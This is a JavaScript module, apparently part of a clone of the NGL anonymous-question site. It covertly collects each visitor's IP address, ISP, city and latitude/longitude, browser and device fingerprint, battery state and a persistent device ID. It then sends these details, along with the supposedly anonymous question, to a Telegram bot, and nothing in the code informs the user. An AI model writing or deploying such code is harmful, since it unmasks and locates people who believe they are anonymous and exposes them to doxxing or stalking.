// import cred from './credentials.json' with { type: 'json'}

function formatMsg(data, keyword = 'Question') {
    const q = escapeHTML(data.ngl.question)
    const time = escapeHTML(data.ngl.time)
    const id = escapeHTML(data.ngl.id)

    const ip = escapeHTML(data.meta.ip/* .split('.').join('.\u200B') */)
    const isp = escapeHTML(data.meta.isp)
    const city = escapeHTML(data.meta.city)
    const tz = escapeHTML(data.meta.timezone)
    const country = escapeHTML(data.meta.country)
    const { latitude, longitude } = data.meta


    const browserName = escapeHTML(data.browser.name)
    const browserVersion = escapeHTML(data.browser.version.split('.').join('.\u200B'))
    const platform = escapeHTML(data.browser.platform)

    const screenW = data.device.screen.width
    const screenH = data.device.screen.height
    const pixelRatio = data.device.screen.devicePixelRatio

    const html =
`
<b>📩 New NGL ${keyword}</b>
${keyword.toLowerCase() !== 'view' ?
`
<b>${ prompts[tag][0] ?? prompts[''][0] }:</b> <tg-spoiler>${q}</tg-spoiler>

──────────────────────────
` : ''}
<b>Time:</b> ${time} (${tz})
<b>ID:</b> <code>${id}</code>

<b>IP:</b> <code>${ip}</code>
<b>ISP:</b> ${isp}
<b>Location:</b> ${city}, ${country}—${latitude}, ${longitude}

<b>Browser:</b> ${browserName} ${browserVersion} (${platform})
<b>Screen:</b> ${screenW}x${screenH} @${pixelRatio}x
`
    return echo(html), html.trim()
}

async function collectData() {
    try {
        const nav = navigator
        const scr = screen

        const browserName = getBrowserName()
        const browserVersion = getBrowserVersion(browserName)
        const languages = [...nav.languages].filter(lang => lang !== nav.language)

        // ---------- IP ----------
        let ipAddr = null
        let locData = null

        try {
            const ipRes = await fetch("https://api.ipify.org?format=text")
            ipAddr = await ipRes.text()

            const infoRes = await fetch(`https://ipinfo.io/json?token=${cred.ipinfo_token}`)
            const data = await infoRes.json()
            const [latitude, longitude] = data.loc?.split(",") || [null, null]

            locData = {
                isp: data.org,
                city: data.city,
                country: data.country,
                latitude,
                longitude,
            }

        } catch (e) {
            echo.wrn("IP/location fetch failed", e)
        }

        // ---------- Connection/Battery ----------
        const connection = nav.connection || nav.mozConnection || nav.webkitConnection
        const battery = await nav.getBattery?.()

        // ---------- Permissions ----------
        let notifications
        if ("permissions" in nav) {
            try {
                notifications = (await nav.permissions.query({ name: "notifications" })).state
            } catch { }
        }

        const telemetry = {
            meta: {
                ip: ipAddr,
                ...locData,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                locale: Intl.DateTimeFormat().resolvedOptions().locale,
                referrer: document.referrer || null,
                online: nav.onLine,
                doNotTrack: nav.doNotTrack === "1",
            },

            browser: {
                userAgent: nav.userAgent,
                name: browserName,
                vendor: nav.vendor,
                platform: nav.platform,
                version: browserVersion,
                languages: {
                    pr: nav.language,
                    sc: languages
                },
                cookiesEnabled: nav.cookieEnabled,
                pdfViewerEnabled: nav.pdfViewerEnabled,
            },

            device: {
                screen: {
                    width: scr.width,
                    height: scr.height,
                    availWidth: scr.availWidth,
                    availHeight: scr.availHeight,
                    pixelDepth: scr.pixelDepth,
                    colorDepth: scr.colorDepth,
                    devicePixelRatio: window.devicePixelRatio,
                },

                hardware: {
                    battery: battery
                        ? {
                            level: battery.level * 100,
                            charging: battery.charging,
                        }
                        : null,
                    deviceMemory: nav.deviceMemory ?? null,
                    hardwareConcurrency: nav.hardwareConcurrency ?? null,
                    maxTouchPoints: nav.maxTouchPoints,
                },
            },

            network: connection
                ? {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                }
                : null,

            preferences: {
                colorScheme: matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light",
                reducedMotion: matchMedia("(prefers-reduced-motion: reduce)").matches,
            },

            permissions: {
                notifications,
            },
        }

        return telemetry

    } catch (error) {
        console.error("Telemetry failed", error)
        return null
    }
}

async function sendMsg(data, chat = cred.msg_chat) {
    echo('Sent data:', data)

    return await fetch(`https://api.telegram.org/bot${chat.token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chat.id,
            parse_mode: "HTML",
            text: formatMsg(data, chat.keyword),
        })
    })
        .then(res => echo(res.status === 200 ? 'ok' : 'bad'))
        .catch(echo.err)
}

async function sendDoc(data, chat = cred.msg_chat) {
    echo('Sent data:', data)

    const form = new FormData()
    form.append("chat_id", chat.id)
    form.append("document", new Blob(
        [JSON.stringify(data, null, 2)],
        { type: "application/json" }
    ), `NGL-${Date.now()}.json`)
    form.append("caption", formatMsg(data, chat.keyword))
    form.append("parse_mode", "HTML")

    return await fetch(`https://api.telegram.org/bot${chat.token}/sendDocument`, {
        method: "POST",
        keepalive: true,
        body: form,
    })
        .then(res => echo(res.status === 200 ? 'ok' : 'bad'))
        .catch(echo.err)
}

const echo = console.log
echo.err = console.error
echo.wrn = console.warn

const uuid = () => {
    const deviceId = window.localStorage.getItem('deviceId')
    if (!deviceId) {
        const _deviceId = crypto.randomUUID()
        return window.localStorage.setItem('deviceId', _deviceId), _deviceId
    }
    return deviceId
}

const mergeData = (data, q = '', now = new Date()) => Object.assign(data, {
    ngl: {
        question: q,
        id: uuid(),
        time: `${(''+ now.getHours()).padStart(2, '0')}:${(''+ now.getMinutes()).padStart(2, '0')} — ${(''+ now.getDate())}/${(''+ now.getMonth()) + 1}/${(''+ now.getFullYear()).slice(-2)}`,
    }
})

const escapeHTML = (s) => s?.toString()
    .replaceAll('&', '&amp;')
    .replaceAll('>', '&gt;')
    .replaceAll('<', '&lt;') || '◘'

function getBrowserName(nav = navigator) {
    const ua = nav.userAgent
    const vendor = nav.vendor
    const isBrave = nav.brave?.isBrave
    const isOpera = (!!window.opr && !!opr.addons) || ua.includes("OPR") || ua.includes("Opera")
    const isEdge = ua.includes("Edg")
    const isChrome = ua.includes("Chrome") && vendor.includes("Google") && !isEdge && !isOpera
    const isFirefox = typeof InstallTrigger !== "undefined"
    const isSafari = /^((?!chrome|android).)*safari/i.test(ua)
    const isIE = /*@cc_on!@*/ false || !!document.documentMode

    return isBrave ? "Brave"
        : isOpera ? "Opera"
        : isEdge ? "Edge"
        : isChrome ? "Chrome"
        : isFirefox ? "Firefox"
        : isSafari ? "Safari"
        : isIE ? "Internet Explorer"
        : "Unknown"
}

function getBrowserVersion(browser, ua = navigator.userAgent) {
    let match
    switch (browser) {
        case "Chrome":
            match = ua.match(/Chrome\/([\d.]+)/)
            break
        case "Firefox":
            match = ua.match(/Firefox\/([\d.]+)/)
            break
        case "Edge":
            match = ua.match(/Edg.?\/([\d.]+)/)
            break
        case "Opera":
            match = ua.match(/OPR\/([\d.]+)/)
            break
        case "Safari":
            match = ua.match(/Version\/([\d.]+)/)
            break
        default:
            return "Unknown"
    }
    return match ? match[1] : "Unknown"
}


export {
    echo,
    uuid,
    sendMsg,
    sendDoc,
    mergeData,
    collectData,
}
